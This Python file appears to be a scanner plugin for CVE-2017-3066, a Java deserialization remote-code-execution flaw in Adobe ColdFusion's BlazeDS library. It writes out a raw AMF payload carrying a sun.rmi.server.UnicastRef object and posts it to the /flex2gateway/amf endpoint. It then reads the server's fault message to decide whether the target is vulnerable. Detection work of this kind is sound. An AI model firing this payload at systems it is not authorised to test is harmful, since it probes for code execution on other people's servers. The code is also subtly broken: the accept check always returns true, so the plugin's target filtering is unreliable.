"""Agent Asteroid implementation for CVE-2017-3066"""

import base64
import datetime
import logging
import struct

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

''' required to decode  the AMF response'''
import pyamf
from pyamf import remoting



VULNERABILITY_TITLE = "Java deserialization vulnerability in the Apache BlazeDS library in Adobe ColdFusion"
VULNERABILITY_REFERENCE = "CVE-2017-3066"
VULNERABILITY_DESCRIPTION = """
A critical Remote Code Execution (RCE) vulnerability exists in Adobe ColdFusion versions 2016 Update 3 and prior, 
11 Update 11 and prior, and 10 Update 22 and prior. 
This issue stems from insecure Java deserialization within the Apache BlazeDS library, 
enabling attackers to execute arbitrary code on the affected server.
"""

RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
CF_AMF_ENDPOINT = "/flex2gateway/amf"
CF_ADMIN = "/CFIDE/administrator/index.cfm"
CF_INDICATOR = "<title>ColdFusion Administrator Login</title>" 
AMF_MESSAGE_VULN = "There was an unhandled failure on the server. java.lang.NullPointerException"
AMF_MESSAGE_SECURE = "Creation validation for class 'sun.rmi.server.UnicastRef' failed." 




@exploits_registry.register
class BlazeDsRCEExploit(webexploit.WebExploit):
    """
    CVE-2017-3066: Adobe ColdFusion Remote Code Execution (RCE)
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Check if the target appears to be a ColdFusion server.
        """
        try:
            response = self.session.get(
                f"{target.origin}", verify=False, timeout=DEFAULT_TIMEOUT.seconds
            )
            return CF_ADMIN or CF_INDICATOR in response.text
        except requests_exceptions.RequestException:
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Exploit the unsafe deserialization vulnerability in ColdFusion BlazeDS.
        """
        vulnerabilities: list[definitions.Vulnerability] = []

        # Vulnerability Logic starts
        amf_payload = b'\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' + \
                      b'\x07\x33' + b'sun.rmi.server.UnicastRef' + struct.pack('>H', len("127.0.0.1")) + b"127.0.0.1" + \
                      struct.pack('>I', 1099) + \
                      b'\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00'

        headers = {'Content-Type': 'application/x-amf'}
        
        try:
            response = self.session.post(
                f"{target.origin}{CF_AMF_ENDPOINT}",
                headers=headers,
                data=amf_payload,
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds
            )
            
            if response.content:
                try:
                    resp_msg = remoting.decode(response.content)
                    for body in resp_msg.bodies:
                        message = body[1]
                        try:
                            fault_string = message.body.faultString
                            if "There was an unhandled failure on the server. java.lang.NullPointerException" in fault_string:
                                logging.info("Vulnerability detected on %s: Deserialization caused NullPointerException", target.origin)
                                vuln = self._create_vulnerability(target)
                                vulnerabilities.append(vuln)
                        except AttributeError:
                            continue
                except Exception as e:
                    logging.debug("Error decoding AMF response: %s", e)
        # Vulnerability Detection Logic Ends
      
        except requests_exceptions.RequestException as e:
            logging.error("Error while exploiting Coldfusion/BlazeDS RCE: %s", e)
            return[]

        return vulnerabilities

  



